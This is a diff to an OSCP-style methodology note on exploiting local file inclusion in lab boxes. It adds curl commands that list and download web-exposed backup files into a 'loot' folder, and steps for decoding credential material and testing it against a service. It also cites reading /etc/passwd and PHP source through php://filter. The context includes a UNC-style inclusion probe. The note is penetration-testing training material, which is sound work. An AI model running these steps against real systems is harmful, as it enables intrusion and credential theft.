@@ -89,6 +89,21 @@ curl -s "http://$BoxIP/index.php?view=\\/$LocalIP/share/probe"
 - [ ] Backslashes are blocked but forward slashes change the response → **Continue with the forward-slash form and document the filter bypass**
 - [ ] All forms are blocked → **Return to ordinary LFI paths or Step 10 · [[Windows - Exploit Search]]**
 
+## Application file-list branch
+
+After confirming the include primitive, check the application itself for a file-listing helper or named backup file. This is often lower-noise than blind filesystem fuzzing.
+
+```bash
+curl -s "http://$BoxIP/listfiles.php"
+curl -s "http://$BoxIP/$Path" -o "$BoxDir/loot/$Filename"
+```
+
+If the response contains repeated Base64 layers, save it, remove only the known banner lines, and decode into private loot with a bounded loop. Do not print the final value.
+
+## Additional routing
+
+- [ ] A web-disclosed backup contains credential material → **Go to Step 17 · [[Linux - Credential Search]] and validate it once against the identified service**
+
 ## External Resources
 
 | Resource | Link |
@@ -99,6 +114,7 @@ curl -s "http://$BoxIP/index.php?view=\\/$LocalIP/share/probe"
 - [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- file parameter included /etc/passwd and php://filter exposed PHP source
 
 ## Related stages
 
